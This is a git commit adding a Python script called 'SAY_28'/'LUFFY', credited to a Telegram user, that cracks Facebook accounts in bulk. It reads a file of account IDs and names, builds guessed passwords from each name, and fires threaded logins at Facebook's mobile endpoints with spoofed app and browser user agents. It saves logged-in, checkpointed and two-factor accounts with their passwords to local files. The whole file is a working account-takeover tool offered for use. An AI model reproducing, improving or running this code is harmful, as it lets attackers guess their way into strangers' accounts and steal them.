cf2f41e6834fa02a28c16f01ee6abff560ad8449
Khalil188 <166438642+Khalil188@users.noreply.github.com>
2024-06-02 14:19:57 +0100

    Add files via upload

---
+++ SAY_28.py
@@ -0,0 +1,379 @@
+#---------------------[IMPORT]---------------------#
+from datetime import datetime
+
+current_date_time = datetime.now()
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+import os,sys,time,json,random,re,string,platform,base64,platform,uuid
+import requests,random,sys,json,os,re
+from time import sleep
+from os import system
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
+import os,sys,time,json,random,re,string,platform,base64,uuid
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+except ModuleNotFoundError:
+    os.system('pip install --upgrade pip && pip install requests futures==2 > /dev/null')
+    os.system('python LUFFY.py')
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.0001)
+sys.stdout.write('\x1b[1;35m\x1b]2; LUFFY\x07')
+
+import requests
+import bs4
+import sys
+import os
+import random
+import time
+import re
+import json
+import uuid
+import subprocess
+import marshal
+import rich
+import shutil
+import webbrowser
+from random import randint
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from bs4 import BeautifulSoup as par
+from datetime import date
+from datetime import datetime
+# from rich import print as printer
+from datetime import date
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+import os
+try:
+    import requests
+except(ImportError):
+    os.system("pip install requests")
+    pass
+ranasys = ("anaaahilsystems")
+try:
+    import socks
+except(ImportError):
+    os.system("pip install -U requests[socks]")
+    pass
+try:
+    import bs4
+except(ImportError):
+    os.system("pip install bs4")
+    pass
+
+from bs4 import BeautifulSoup
+import json,os,time,base64,random,re,sys
+#from requests.exceptions import ConnectionError as CError
+from concurrent.futures import ThreadPoolExecutor as tpe
+
+rug=[]
+for nt in range(10000):
+    rr=random.randint
+    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    rx=random.randrange(1, 999)
+    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}.1.0; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
+    rug.append(xx)
+
+HBF = '{ HBF }'
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+hamii2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
+import random
+
+def clear():
+    os.system('clear')
+    print(logo)
+#--------------------COLORS--------------------#
+
+A = '\x1b[1;97m' 
+B = '\x1b[1;96m' 
+C = '\x1b[1;91m' 
+D = '\x1b[1;92m'
+M = '\033[1;31m'
+H = '\033[1;32m'
+N = '\x1b[1;37m'
+E = '\x1b[1;93m'
+F = '\x1b[1;94m'
+G = '\x1b[1;95m'
+PURPLE ='\x1b[38;5;46m'
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m'
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+BLACK="\033[1;30m"
+
+#--------------------LOGO--------------------#
+logo ='\033[32m'"""          
+⠀ ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+\033[1;32m×××\033[1;97m×××××××××××××××××××××××××××××××××××××××××\033[1;32m×××
+\033[1;32m[\033[1;97m+\033[1;32m]\033[91m Owner   :            @Joker4_4
+\033[1;32m[\033[1;97m+\033[1;32m]\033[92m TELE    :            https://t.me/JokerB28        
+\033[1;32m[\033[1;97m+\033[1;32m] \033[93mGithub  :            Hackers 
+\033[1;32m[\033[1;97m+\033[1;32m]\033[96m Version :            2.1
+\033[1;32m[\033[1;97m+\033[1;32m]\033[95m TYP     :            FREE\033[1;32m
+×××\033[1;97m×××××××××××××××××××××××××××××××××××××××××\033[1;32m×××\033[1;37m"""
+
+
+
+def linex():
+    print(f'{GREEN}×××{WHITE}×××××××××××××××××××××××××××××××××××××××××{GREEN}×××{WHITE}')
+
+
+
+
+loop = 0
+ok = []
+cp = []
+tf = []
+ua_android = []
+ua_opera = []
+user=[]
+ugen=[]
+for xd in range(10000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (SAY, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+def exit():
+    os.sys.exit()
+def main():
+    os.system('clear && rm -rf .txt .t.txt')
+    print(logo)
+    print(f'{GREEN}[{WHITE}1{GREEN}]{WHITE} FILE CRACK')
+    print(f'{GREEN}[{WHITE}2{GREEN}]{WHITE} REMOVE NEW IDS')
+    print(f'{GREEN}[{WHITE}3{GREEN}]{WHITE} UNBLUCK IP {RED}[SOON]{WHITE}')
+    print(f'{GREEN}[{WHITE}4{GREEN}]{WHITE} TELE {GREEN}[JOIN]{WHITE}')
+ 
+    
+    print('')
+    HAMII = input(f'{WHITE} {GREEN}[{WHITE}+{GREEN}]{WHITE} COHSE : ')
+    if HAMII in ["1","01"]: 
+        file_crack()
+    elif HAMII in ["2","02"]:
+        REMOVENIDS()
+    elif HAMII in ["4","00"]:
+        os.system("xdg-open https://t.me/JokerB28")
+    elif HAMII in ["0","00"]:
+        os.system('rm -rf fb_cookies.txt')
+        exit()
+    else:
+        print('\033[1;31mINCORECT OPTION !!!!');main()
+
+def file_crack():
+    global ok,cp,tf
+    os.system('clear')
+    print(logo)
+    print(f'{GREEN}[{WHITE}1{GREEN}]{WHITE} METHOD{GREEN} [MIX] ')
+    print(f'{GREEN}[{WHITE}2{GREEN}]{WHITE} METHOD{GREEN} [NEW] ')
+    print("")
+    opt_method = input(f'{GREEN}[{WHITE}+{GREEN}]{WHITE} CHOSE METHOD : ')
+    os.system('clear')
+    print(logo) 
+    file = input(f'{GREEN}[{WHITE}+{GREEN}]{WHITE} PUT FILE NAME :{GREEN} ')
+    try:
+        fo = open(file,'r').read().splitlines()
+    except FileNotFoundError:
+        print(' YOUR GIVEN FILE IS NOT FOUND IN STORAGE ⚠️ ...')
+        time.sleep(1)
+        file_crack()
+    plist = []
+    plist = []
+    try:
+        clear()
+        print(f'{GREEN}[{WHITE}+{GREEN}]{WHITE} LIMIT OF PASS {GREEN}[{WHITE}15{GREEN}/{WHITE}20{GREEN}]{WHITE}\n')
+        print("")
+        ps_limit = int(input(f'{GREEN}[{WHITE}+{GREEN}]{WHITE} LIMIT PASS : '))
+    except:
+        ps_limit =1
+    print(' ')
+    os.system('clear')
+    print(logo)
+    for i in range(ps_limit):
+        plist.append(input(f'{GREEN}[{WHITE}+{GREEN}]{WHITE} PASSWORD  {i+1}: '))
+    with ThreadPool(max_workers=30) as crack_submit:
+        os.system('clear')
+        print(logo)
+        total_ids = str(len(fo))
+      #  print(f"{GREEN} [{WHITE}DATE{GREEN}]{WHITE}           :{GREEN}", current_date_time)
+        print(f'{GREEN} [{WHITE}TOTAL IDS{GREEN}] {WHITE}     :{GREEN} '+total_ids)
+        print(f' {GREEN}[{WHITE}LIMIT OF PASS{GREEN}]{WHITE}  :{GREEN}',ps_limit)
+        print(f' {GREEN}[{WHITE}SELECT METHOD{GREEN}]{WHITE}  :{GREEN}','M',opt_method)
+        print(f"\r{GREEN} [{WHITE}ON{GREEN}/{WHITE}OFF{GREEN}]{WHITE}AIREPLANE EVERY {GREEN}2{WHITE}MIN")
+        linex()
+        for user in fo:
+            ids,names = user.split('|')
+            passlist = plist
+            if opt_method =='1':
+                crack_submit.submit(method1,ids,names,passlist,total_ids)
+            elif opt_method =='2':
+                crack_submit.submit(method2,ids,names,passlist,total_ids)
+            else:
+                crack_submit.submit(method1,ids,names,passlist,total_ids)
+    print('\n\033[1;37m[+]══════════════════════════════════════════')
+    print('[•] CLONING COMPLETED\n[•] YOUR OK IDS : '+str(len(ok))+'\n[•] TOTAL CP IDS : '+str(len(cp)))
+    print('\033[1;37m[+]══════════════════════════════════════════')
+    print('[•] OK IDS SAVE : /sdcard/SAY-28_OK.txt\n[•] CP IDS SAVE : /sdcard/SAY-28_CP.txt')
+    input('[•] PRESS ENTER TO BACK MENU   ')
+    main()
+def method1(ids,names,passlist,total_ids):
+    global loop,ok,cp,tf,ua_opera
+    rcol =['\033[1;32m','\033[1;31m']
+    rr = random.choice(rcol)
+    whi = '\033[0;97m'
+    sys.stdout.write(f'\r%s {WHITE}{GREEN}[{WHITE}LUFFY{GREEN}]{WHITE}%s[%s] {GREEN}[{WHITE}OK:%s CP:%s 2F:%s{GREEN}]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
+    try:
+        first = names.split(' ')[0]
+        try:
+            last = names.split(' ')[1]
+        except:
+            last = 'Khan'
+        ps = first.lower()
+        ps2 = last.lower()
+        for fikr in passlist:
+            ua = random.choice(ugen)
+            ua1 = random.choice(rug)
+            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
+            r = requests.Session()
+            url1 = f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr'
+            hed1 = {'User-Agent': '[FBAN/FB4A;FBAV/18.0.0.4214;FBBV/3583824;[FBAN/Orca-Android;FBAV/41.0.0.69.21;FBBV/11557663;FBDM/{density=4.8,width=1080,height=1920};FBLC/en_GB;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-G901F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Content-Type': 'application/x-www-form-urlencoded', 'x-fb-Connection-Type': 'MOBILE.LTE', 'Accept': '*/*', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '39661', 'X-FB-SIM-HNI': '25420', 'X-Fb-Connection-Bandwidth': '21157192', 'Priority': 'u=3,i', 'Zero-Rated': '0', 'X-Fb-Connection-Quality': 'GOOD', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-Fb-Device-Group': '5120', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'Content-Length': '1875'}
+            req1 = r.get(url1,headers=hed1)
+            data = {'lsd' : re.search('name="lsd" value="(.*?)"',str(req1.text)).group(1),'jazoest' : re.search('name="jazoest" value="(.*?)"',str(req1.text)).group(1),'uid' : ids,'pass' : pas,'next' : f'https://p.facebook.com/login/save-device/','flow' : 'login_no_pin','submit' : 'Log In'}
+            url2 = f'https://p.facebook.com/login/device-based/validate-password/?shbl=0'
+            hed2 = {'User-Agent': '[FBAN/FB4A;FBAV/18.0.0.4214;FBBV/3583824;[FBAN/Orca-Android;FBAV/41.0.0.69.21;FBBV/11557663;FBDM/{density=4.8,width=1080,height=1920};FBLC/en_GB;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-G901F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Content-Type': 'application/x-www-form-urlencoded', 'x-fb-Connection-Type': 'MOBILE.LTE', 'Accept': '*/*', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '39661', 'X-FB-SIM-HNI': '25420', 'X-Fb-Connection-Bandwidth': '21157192', 'Priority': 'u=3,i', 'Zero-Rated': '0', 'X-Fb-Connection-Quality': 'GOOD', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-Fb-Device-Group': '5120', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'Content-Length': '1875'}
+            next = r.post(url2,data=data,headers=hed2,allow_redirects = False).text
+            cookies = r.cookies.get_dict().keys()
+            if 'c_user' in cookies:
+                print('\r\033[1;32m[LUFFY-OK] '+ids+' | '+pas+'\033[1;97m')
+                ok.append(ids)
+                open('/sdcard/LUFFY_OK.txt', 'a').write(ids+' | '+pas+'\n')
+                break
+            elif 'checkpoint' in cookies:
+                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
+                #print(d.group(1))
+                if 'Enter login code to continue' in str(d):
+                    print('\r\033[1;35m[LUFFY] '+ids+' | '+pas+'\033[1;97m')
+                    tf.append(ids)
+                    open('/sdcard/LUFFY_2F.txt', 'a').write(ids+' | '+pas+'\n')
+                    break
+                else:
+                    print('\r\033[1;31m[LUFFY-CP] '+ids+' | '+pas+'\033[1;97m')
+                    cp.append(ids)
+                    open('/sdcard/LUFFY_CP.txt', 'a').write(ids+' | '+pas+'\n')
+                    break
+            else:continue
+        loop+=1
+    except Exception as e:
+        pass
+
+def method2(ids,names,passlist,total_ids):
+    global loop,ok,cp,tf,ua_opera
+    rcol =['\033[1;32m','\033[1;31m']
+    rr = random.choice(rcol)
+    whi = '\033[0;97m'
+    sys.stdout.write(f'\r%s {WHITE}{GREEN}[{WHITE}LUFFY{GREEN}]{WHITE}%s[%s] {GREEN}[{WHITE}OK:%s CP:%s 2F:%s{GREEN}]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
+    try:
+        first = names.split(' ')[0]
+        try:
+            last = names.split(' ')[1]
+        except:
+            last = 'Khan'
+        ps = first.lower()
+        ps2 = last.lower()
+        for fikr in passlist:
+            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
+            session = requests.Session()
+            url = 'https://mbasic.facebook.com/?ref=opera_speed_dial_freefb'
+            raw = session.get(url).text
+            payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(raw)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(raw)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(raw)).group(1),"li":re.search('name="li" value="(.*?)"', str(raw)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,"pass":pas,"login":"Log In"}
+            header = ({'authority':'https://mbasic.facebook.com',
+            'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-encoding':'*;q=0.1',
+            'accept-language':'en-PK,en;q=0.9',
+            'cache-control':'private, no-cache, no-store, must-revalidate',
+            'upgrade-insecure-requests':'1',
+            'user-agent':random.choice(ugen),
+            'connection':'keep-alive'})
+            post_request = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8&amp;ref=opera_speed_dial_freefb',data=payload,headers=header).text
+            cookies = session.cookies.get_dict().keys()
+            #open('jhuk.html', 'w').write(post_request)
+            if 'c_user' in cookies:
+           
+                print('\r\033[1;32m[LUFFY-OK] '+ids+' | '+pas+'\033[0;97m')
+                ok.append(ids)
+                open('/sdcard/LUFFY.txt_OK.txt', 'a').write(ids+' | '+pas+'\n')
+                break
+            elif 'checkpoint' in cookies:
+                d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
+                #print(d.group(1))
+                if 'Enter login code to continue' in str(d.group(1)):
+        
+                    print('\r\033[1;35m[LUFFY] '+ids+' | '+pas+'\033[0;97m')
+                    tf.append(ids)
+                    open('/sdcard/LUFFY.txt', 'a').write(ids+' | '+pas+'\n')
+                    break
+                else:
+         
+                    print('\r\033[1;31m[LUFFY-CP] '+ids+' | '+pas+'\033[0;97m')
+                    cp.append(ids)
+                    open('/sdcard/LUFFY_CP.txt', 'a').write(ids+' | '+pas+'\n')
+                    break
+            else:continue
+        loop+=1
+    except Exception as e:
+        pass
+def REMOVENIDS():
+    os.system('clear')
+    print(logo)
+    print("\33[1;36mTHIS TOOL FORE REMVOE NEW IDS 10009,6155")
+    print("\33[1;35mBY : @J11IU ")
+    file_path = input("\33[1;32mPUT FILE : ")
+
+    with open(file_path, 'r') as file:
+        lines = file.readlines()
+
+    # حذف ايديات الجديده
+    filtered_lines = [line for line in lines if not line.startswith(('10009', '6155'))]
+
+    with open(file_path, 'w') as file:
+        for line in filtered_lines:
+            file.write(line)
+
+    print("\33[1;32mDONE REMOVE AND SAVE")
+    time.sleep(2)
+    main()        
+#---------------------[END MENU]---------------------#
+if __name__ == '__main__':
+    main()
